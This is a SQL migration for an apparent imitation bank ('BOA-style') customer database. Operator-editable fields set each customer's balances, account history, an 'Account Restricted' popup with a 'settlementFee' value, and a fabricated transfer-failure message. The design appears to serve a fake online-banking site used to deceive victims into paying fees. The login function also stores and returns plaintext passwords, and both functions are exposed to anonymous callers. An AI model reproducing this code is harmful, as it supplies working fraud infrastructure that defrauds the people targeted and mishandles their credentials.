-- Editable restriction popup + transfer error message per customer (BOA-style)

alter table public.bank_customers
  add column if not exists restriction jsonb not null default jsonb_build_object(
    'title', 'Account Restricted',
    'greeting', 'Dear {name},',
    'message', 'Your account has been restricted.',
    'feeText', 'Reason: Unusual transfer activity was detected and outgoing transfers are temporarily blocked.',
    'button', 'I Understand',
    'support', 'Contact Support',
    'settlementFee', 0
  );

alter table public.bank_customers
  add column if not exists transfer_error jsonb not null default jsonb_build_object(
    'title', 'Error',
    'message', 'We''re sorry, we weren''t able to complete your request. Please try again.',
    'button', 'Retry'
  );

-- Seed sensible defaults for existing rows that still have empty-ish objects
update public.bank_customers
set restriction = jsonb_build_object(
  'title', 'Account Restricted',
  'greeting', 'Dear {name},',
  'message', 'Your account has been restricted.',
  'feeText', 'Reason: Unusual transfer activity was detected and outgoing transfers are temporarily blocked.',
  'button', 'I Understand',
  'support', 'Contact Support',
  'settlementFee', 0
)
where restriction is null
   or restriction = '{}'::jsonb
   or coalesce(restriction->>'title', '') = '';

create or replace function public.authenticate_bank_user(p_username text, p_password text)
returns jsonb
language plpgsql
security definer
set search_path = public
as $$
declare
  row public.bank_customers%rowtype;
begin
  select * into row
  from public.bank_customers
  where username = trim(p_username)
    and password = p_password
  limit 1;

  if not found then
    return null;
  end if;

  return jsonb_build_object(
    'id', row.id,
    'username', row.username,
    'password', row.password,
    'name', row.full_name,
    'firstName', coalesce(nullif(row.first_name, ''), row.full_name),
    'dob', coalesce(row.dob, ''),
    'age', coalesce(row.age, ''),
    'sex', coalesce(row.sex, ''),
    'relationship', coalesce(row.relationship, ''),
    'address', coalesce(row.address, ''),
    'state', coalesce(row.state, ''),
    'zip', coalesce(row.zip, ''),
    'email', coalesce(row.email, ''),
    'phone', coalesce(row.phone, ''),
    'photo', coalesce(row.photo_url, ''),
    'since', coalesce(row.since_label, ''),
    'showAddress', coalesce(row.show_address, false),
    'accountNumber', coalesce(row.account_number, ''),
    'routingNumber', coalesce(row.routing_number, ''),
    'accounts', coalesce(row.accounts, '[]'::jsonb),
    'cardBalance', coalesce(row.card_balance, '$0.00'),
    'spendingBalance', coalesce(row.spending_balance, '$0.00'),
    'showSpendingCard', coalesce(row.show_spending_card, false),
    'showRestrictionNotice', coalesce(row.show_restriction_notice, false),
    'historyExtras', coalesce(row.history_extras, '[]'::jsonb),
    'restriction', coalesce(row.restriction, '{}'::jsonb),
    'transferError', coalesce(row.transfer_error, '{}'::jsonb)
  );
end;
$$;

create or replace function public.admin_upsert_customer(p_token uuid, p_payload jsonb)
returns public.bank_customers
language plpgsql
security definer
set search_path = public, extensions
as $$
declare
  row public.bank_customers%rowtype;
  cid text;
  default_restriction jsonb := jsonb_build_object(
    'title', 'Account Restricted',
    'greeting', 'Dear {name},',
    'message', 'Your account has been restricted.',
    'feeText', 'Reason: Unusual transfer activity was detected and outgoing transfers are temporarily blocked.',
    'button', 'I Understand',
    'support', 'Contact Support',
    'settlementFee', 0
  );
  default_transfer jsonb := jsonb_build_object(
    'title', 'Error',
    'message', 'We''re sorry, we weren''t able to complete your request. Please try again.',
    'button', 'Retry'
  );
begin
  if not public.admin_session_valid(p_token) then
    raise exception 'Unauthorized';
  end if;

  cid := coalesce(nullif(p_payload->>'id', ''), replace(gen_random_uuid()::text, '-', ''));

  insert into public.bank_customers as bc (
    id, username, password, full_name, first_name, dob, age, sex, relationship,
    address, state, zip, email, phone, photo_url, since_label, show_address,
    account_number, routing_number, accounts, card_balance, spending_balance,
    show_spending_card, show_restriction_notice, history_extras, restriction, transfer_error
  ) values (
    cid,
    trim(p_payload->>'username'),
    p_payload->>'password',
    trim(p_payload->>'full_name'),
    coalesce(nullif(p_payload->>'first_name', ''), trim(p_payload->>'full_name')),
    coalesce(p_payload->>'dob', ''),
    coalesce(p_payload->>'age', ''),
    coalesce(p_payload->>'sex', ''),
    coalesce(p_payload->>'relationship', ''),
    coalesce(p_payload->>'address', ''),
    coalesce(p_payload->>'state', ''),
    coalesce(p_payload->>'zip', ''),
    coalesce(p_payload->>'email', ''),
    coalesce(p_payload->>'phone', ''),
    coalesce(p_payload->>'photo_url', ''),
    coalesce(p_payload->>'since_label', ''),
    coalesce((p_payload->>'show_address')::boolean, true),
    coalesce(p_payload->>'account_number', ''),
    coalesce(p_payload->>'routing_number', ''),
    coalesce(p_payload->'accounts', '[]'::jsonb),
    coalesce(p_payload->>'card_balance', '$0.00'),
    coalesce(p_payload->>'spending_balance', '$0.00'),
    coalesce((p_payload->>'show_spending_card')::boolean, false),
    coalesce((p_payload->>'show_restriction_notice')::boolean, false),
    coalesce(p_payload->'history_extras', '[]'::jsonb),
    coalesce(p_payload->'restriction', default_restriction),
    coalesce(p_payload->'transfer_error', default_transfer)
  )
  on conflict (id) do update set
    username = excluded.username,
    password = excluded.password,
    full_name = excluded.full_name,
    first_name = excluded.first_name,
    dob = excluded.dob,
    age = excluded.age,
    sex = excluded.sex,
    relationship = excluded.relationship,
    address = excluded.address,
    state = excluded.state,
    zip = excluded.zip,
    email = excluded.email,
    phone = excluded.phone,
    photo_url = excluded.photo_url,
    since_label = excluded.since_label,
    show_address = excluded.show_address,
    account_number = excluded.account_number,
    routing_number = excluded.routing_number,
    accounts = excluded.accounts,
    card_balance = excluded.card_balance,
    spending_balance = excluded.spending_balance,
    show_spending_card = excluded.show_spending_card,
    show_restriction_notice = excluded.show_restriction_notice,
    history_extras = excluded.history_extras,
    restriction = excluded.restriction,
    transfer_error = excluded.transfer_error
  returning * into row;

  return row;
end;
$$;

grant execute on function public.authenticate_bank_user(text, text) to anon, authenticated;
grant execute on function public.admin_upsert_customer(uuid, jsonb) to anon, authenticated;
